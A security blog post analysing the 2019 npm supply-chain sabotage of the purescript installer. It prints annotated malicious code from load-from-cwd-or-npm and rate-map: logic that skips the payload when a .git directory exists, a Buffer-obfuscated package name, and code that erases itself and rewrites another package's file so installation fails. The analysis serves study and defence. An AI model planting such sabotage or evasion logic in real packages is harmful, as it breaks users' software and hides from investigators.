---
layout: post
title: My Favourite Dep Malware PureScript NPM Installer
subtitle: A tale of a really cool piece of malware you probably haven't heard of
toc: true
#cover-img: /assets/img/solarwindsceocv.png
thumbnail-img: /assets/img/post5/npm-installer.png
share-img: /assets/img/post5/npm-installer.png
tags: [supplychain, sdlc]
---

#### Background


In July 2019, code was added to an upstream of the [`purescript` npm installer](https://www.npmjs.com/package/purescript) which sabotaged the completion of the installation process in a particularly interesting way. The subterfuge was particularly difficult to uncover/debug, taking 5 days for some of the most talented and skilled npmjs devs almost 5 days to unravel. It wouldn't be unfair to say that this event "stumped" (their words, not mine) some of the most talented and well versed engineers in this space.
It's my favourite dep malware, not because it resulted in some epic hack, but because it was so well executed by somebody with an innate understanding of the downstream landscape.

The malware takes advantage of how downstream projects load in the affected code, it uses conditional exploitation logic to hamper debug efforts, and uses just the right level of obfuscation to not immediately look suspect (no super sus looking B64'd blobs here). The malicious software also cleans up after itself.

In this post I hope to step through just how all this took place, so maybe we can all be impressed and together. This particular event got very little coverage, so hopefully you find reading about it notable even though it was a little while ago.

My colleagues really like it when I annotate malware for them, particularly side-by-side, so here's an attempt at posting in that format.

#### Timeline



#### What you're looking at / code intent

The samples below both sabotage the `purescript`  npm installer process to prevent it running successfully under certain conditions.





####   The Details: exploit version 1 `load-from-cwd-or-npm@3.0.2`

You can grab a copy of the dependency off of my repo here:  [`load-from-cwd-or-npm@3.0.2`](https://github.com/5stars217/My_Fav_Malware/tree/main/load-from-cwd-or-npm-3.0.2)

Load up a editor and open `load-from-cwd-or-npm@3.0.2` index.js file.

Check out lines 50 - 83: - I am going to #annotate the below snippet for you, watch out for the comments (#) in the code snippet.
The below code is designed to determine the environment it is running in, and decide what action to take.

`const tasks = [PassThrough];`

    //Create tasks array containing the Passthrough Stream Constructor.
    //Call tasks.unshift twice, so that it winds up at index 2 later.

  ``if (argLen === 2) {
     if (typeof args[1] !== 'function') {
        throw new TypeError(`Expected a function to compare two package versions, but got ${
          inspectWithKind(args[1])
    }.`);
  }``

  `} else {`

    // call  tasks.unshift 1

  `tasks.unshift(resolveSemverFromNpm);

  }`

      //call tasks.unshift 2. Now the PassThrough constructor is at index 2 in the tasks array.

`tasks.unshift(resolveFromNpm(modulePkgId));``

`try {
  const results = await Promise.all(tasks);
  let parent = module;`

    //Here comes a do-while loop that works out how the code is being run,
      //by inspecting the parent property of each module in the chain.
        //Check out the path.endsWith("cli")


`do {   
 parent = parent.parent;`

  `try {
    const {path} = parent;`

    //the attacker is deciding whether or not to run the exploit code,
    //by checking on the version of the purescript npm installer,
    //and if there is a .git working directory.  
    //If the code detects a .git working directory, it'll skip the exploit.
    //This is because .git directories aren't present in production environments,
    //so it makes debugging this issue way harder.
    // The intent is to  determine if a particular version of an installer is being run,
    //and if the code is being run in a environment where it could be easily debugged!



`if (path.endsWith('cli') || [path, dirname(path)].some(dir => existsSync(resolve(dir, '.git')))) {
      parent = 'npm';
      break;
    }
  } catch (_) {}
} while (parent);`

    //The purpose of this parent variable is just the layup for the exploit code if
      //the above conditions are met to allow for it.


`if (typeof parent !== 'string') {
    return results[2];
}`


    //here's that [2] what's happening here is an if statement
    //returning the PassThrough constructor
    //in the case where the malicious code is being run,
    //this breaks a related function to pull down some
    //packages to complete the building of the software:


`const request = loadFromCwdOrNpm("request");
request("https://github.com/.../archive.tar.gz").pipe(...);`




#### The Details: exploit version 2 `rate-map@1.0.3`

You can grab a copy of the dependency off of my repo here:  [`rate-map@1.0.3`](https://github.com/5stars217/My_Fav_Malware/tree/main/rate-map-1.0.3/package)

Things get a little spicier from this point on. This version of the exploit contains the same `do-while` loop decision gate on exploitation, but it includes some significant upgrades.

`let parent = module;
const {
  existsSync: existsSync,
  readFileSync: readFileSync,
  writeFileSync: writeFileSync
} = require("fs");`


    //You'll see the same check here if the code is running in a debug or non production environment.
    //But it'll also check for the presence of the `dl-tar` package on local filesystem via obfuscation:


`do {
  parent = parent.parent;

  try {
    const { path: path } = parent;`

    `if (
      path.endsWith("cli") ||

      [path, dirname(path)].some(dir => existsSync(resolve(dir, ".git")))
    ) {

      parent = "npm";
      break;
    }
  } catch (_) {}


} while (parent);

if (typeof parent !== "string") {


  const px = require.resolve(`

      // `Buffer.from` obfuscates the check for the `dl-tar` package on local filesystem.


`Buffer.from([100, 108, 45, 116, 97, 114]).toString()
  );`

      //store the `index.js` from `dl-tar` in the `px` variable in the next block, which will rewrite the current file to remove the malicious code!

  `try {
    writeFileSync(
      __filename,
      readFileSync(__filename, "utf8").replace(
        /let parent[^\0]*module\.exports/u,
        "module.exports"
      )
    );
  } catch (_) {}`


      //this next block replaces any lines in `dl-tars`'s `index.js` file to match the regex `/\n\s*cb\(null, chunk\` with empty strings, the result is that `dl-tar` users can't install the project.


  `try {
    writeFileSync(
      px,
      readFileSync(px, "utf8").replace(/\n\s*cb\(null, chunk\);/u, "")
    );
  } catch (_) {}
}`



#### Final Notes

I intentionally skipped over some background information surrounding the disagreements between authors of `purescript` and `load-from-cwd-or-npm` etc. I just think the techniques used particularly  in `rate-map@1.0.3` are great uses of light (but effective) obfuscation and conditional exploitation.
